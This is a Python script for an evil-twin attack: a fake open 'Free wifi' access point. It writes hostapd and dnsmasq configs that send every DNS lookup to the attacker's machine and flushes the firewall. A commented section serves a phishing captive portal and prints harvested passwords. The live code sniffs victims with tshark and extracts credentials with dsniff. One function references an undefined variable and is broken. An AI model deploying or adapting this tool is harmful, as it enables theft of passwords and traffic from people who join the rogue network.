# import os
# import signal
# import time


# def reset_setting():
#     os.system('service NetworkManager start')
#     os.system('service apache2 stop')
#     os.system('service hostapd stop')
#     os.system('service dnsmasq stop')
#     os.system('killall dnsmasq >/dev/null 2>&1')
#     os.system('killall hostapd >/dev/null 2>&1')
#     os.system('systemctl enable systemd-resolved.service >/dev/null 2>&1')
#     os.system('systemctl start systemd-resolved >/dev/null 2>&1')

# # def AP_on(iface):
# #     os.system('systemctl disable systemd-resolved.service >/dev/null 2>&1')
# #     os.system('systemctl stop systemd-resolved >/dev/null 2>&1')
# #     os.system('service network-manager stop')
# #     os.system(' pkill -9 hostapd')
# #     os.system(' pkill -9 dnsmasq')
# #     os.system(' pkill -9 wpa_supplicant')
# #     os.system(' pkill -9 avahi-daemon')
# #     os.system(' pkill -9 dhclient')
# #     os.system('killall dnsmasq >/dev/null 2>&1')
# #     os.system('killall hostapd >/dev/null 2>&1')
# #     os.system("ifconfig "+ iface +" 10.0.0.1 netmask 255.255.255.0")
# #     #os.system('route add default gw 10.0.0.1')
# #     #
# #     os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
# #     os.system('iptables --flush')
# #     os.system('iptables --table nat --flush')
# #     os.system('iptables --delete-chain')
# #     os.system('iptables --table nat --delete-chain')
# #     os.system('iptables -P FORWARD ACCEPT')

# def AP_on(iface):
#     #Does not prevent the fake AP from broadcasting a wifi signal
#     os.system("service NetworkManager stop")
#     #1.enable IP forwarding so that packets can flow through the computer without being dropped
#     #2.clear any firewall rules that might be redirecting packets to somewhere else.
#     os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
#     os.system('iptables --flush')
#     os.system('iptables --table nat --flush')
#     os.system('iptables --delete-chain')
#     os.system('iptables --table nat --delete-chain')
#     os.system('iptables -P FORWARD ACCEPT')

# def run_AP():
# 	os.system('dnsmasq -C dnsmasq.conf')
# 	os.system('hostapd hostapd.conf -B') #start hostapd and to begin broadcasting a signal.
# 	os.system('ifconfig wlan1 10.0.0.1')
#     # os.system('route add default gw 10.0.0.1')

# def start_apache():
#     #Start Web server to launch the captive portal
#     os.system('service apache2 start')
#     os.system('ifconfig wlan1 10.0.0.1')
#     # os.system('route add default gw 10.0.0.1')
#     os.system('cp html/index.php /var/www/html/')
#     os.system('cp html/pass.php /var/www/html/')
#     os.system('cp html/passwords.txt /var/www/html/')
#     os.system('cp -r html/css /var/www/html/')
#     os.system('cp -r html/js /var/www/html/')
#     os.system('cp -r html/images /var/www/html/')
#     os.system('chmod 777 /var/www/html/passwords.txt')


# def start(iface):
#     reset_setting()
#     AP_on(iface)
#     start_apache()
#     run_AP()
#     empty = input("\nPress Enter to Close Fake Accses Point AND Power OFF the fake AP.........\n")
#     reset_setting()
#     os.system("clear")
#     os.system("cat /var/www/html/passwords.txt")


import os
# import signal
# import time

def Create_hostapd(iface, ssid="Free wifi", channel=1):
    interface_str= "interface="+str(iface)+"\n"
    driver_str="driver=nl80211\n"
    ssid_str= "ssid="+str(ssid)+"\n"
    channel_str = "channel="+str(channel)+" \n"
    conf_str= interface_str+driver_str+ssid_str+channel_str
    f = open("hostapd.conf", "w+")
    f.write(conf_str)
    os.chmod("hostapd.conf",0o777)

#configure dnsmasq to be used as a DHCP server and DNS server.
def Create_dnsmasq(iface):
    iface_str= "interface="+str(iface)+""
    body_str= "\ndhcp-range=192.168.1.2,192.168.1.250,12h"
    body_str+="\ndhcp-option=3,192.168.1.1"
    body_str+="\ndhcp-option=6,192.168.1.1"
    body_str+="\naddress=/#/192.168.1.1"
    conf_str = iface_str+body_str
    f = open("dnsmasq.conf", "w+")
    f.write(conf_str)
    os.chmod("dnsmasq.conf",0o777)   

def Delete_conf_files():
    os.system("rm *.conf")

def init_setting():
    os.system('sudo airmon-ng check kill')

    os.system('service NetworkManager start')
    os.system('service apache2 stop')
    os.system('service hostapd stop')
    os.system('service dnsmasq stop')
    os.system('killall dnsmasq >/dev/null 2>&1')
    os.system('killall hostapd >/dev/null 2>&1')
    os.system('systemctl enable systemd-resolved.service >/dev/null 2>&1')
    os.system('systemctl start systemd-resolved >/dev/null 2>&1')

    os.system('systemctl disable systemd-resolved.service >/dev/null 2>&1')
    os.system('systemctl stop systemd-resolved >/dev/null 2>&1')
    os.system('service NetworkManager stop')
    os.system(' pkill -9 hostapd')
    os.system('sudo pkill -9 dnsmasq')
    os.system(' pkill -9 wpa_supplicant')
    os.system(' pkill -9 avahi-daemon')
    os.system(' pkill -9 dhclient')
    os.system('killall dnsmasq >/dev/null 2>&1')
    os.system('killall hostapd >/dev/null 2>&1')
    
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    os.system('iptables --flush')
    os.system('iptables --table nat --flush')
    os.system('iptables --delete-chain')
    os.system('iptables --table nat --delete-chain')
    os.system('iptables -P FORWARD ACCEPT')

def AP_on(iface):
    os.system('sudo dnsmasq -C dnsmasq.conf')
    os.system('sudo hostapd hostapd.conf -B')
    os.system("sudo ifconfig " + str(iface) + " 192.168.1.1/24")
    os.system("service apache2 start")
    os.system("sudo tshark -i "+ str(iface) +" -w captureAP") #listen to the victim that put his details
    
def get_info_users():
    os.system("sudo dsniff -p captureAP")
    f = open("dnsmasq.conf", "w+")
    f.write(conf_str)

# def setup(iface):
#     init_setting()
#     AP_on(iface)
#     # reset_setting()